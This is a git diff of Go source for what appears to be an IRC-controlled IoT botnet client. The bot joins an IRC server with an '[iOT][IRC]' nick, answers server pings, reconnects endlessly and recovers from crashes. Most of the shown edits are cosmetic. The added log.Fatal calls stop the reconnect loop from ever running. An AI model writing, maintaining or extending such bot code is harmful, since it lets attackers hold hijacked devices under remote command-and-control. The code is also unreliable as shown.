@@ -2,13 +2,15 @@ package main
 
 import (
 	"bufio"
+	"log"
 	"net"
 	"net/textproto"
-	"strconv"
 	"os"
+	"strconv"
 	"strings"
 	"utils"
 )
+
 func NeverExit(f func()) {
 	defer func() {
 		if v := recover(); v != nil {
@@ -19,18 +21,18 @@ func NeverExit(f func()) {
 }
 
 func notexit() {
-	
+
 	for {
-		//server := "1.1.1.1:80"
-	
+		// server := "1.1.1.1:80"
 	CONNS:
-		connection, err := net.Dial("tcp",":80")
+		connection, err := net.Dial("tcp", ":80")
 		if err != nil {
+			log.Fatal(err)
 			goto CONNS
 		}
+		defer connection.Close()
 		connection.Write([]byte("NICK [iOT][IRC][" + utils.RandomString(5, false) + "]\r\n"))
 		connection.Write([]byte("USER linux linux linux :The LinuxXD\r\n"))
-		defer connection.Close()
 
 		reader := bufio.NewReader(connection)
 		tp := textproto.NewReader(reader)
@@ -38,6 +40,7 @@ func notexit() {
 		for {
 			line, err := tp.ReadLine()
 			if err != nil {
+				log.Fatal(err)
 				goto CONNS
 			}
 			if strings.Contains(line, "PING") {
@@ -114,5 +117,5 @@ func notexit() {
 
 func main() {
 	go NeverExit(notexit)
-	select{}
+	select {}
 }
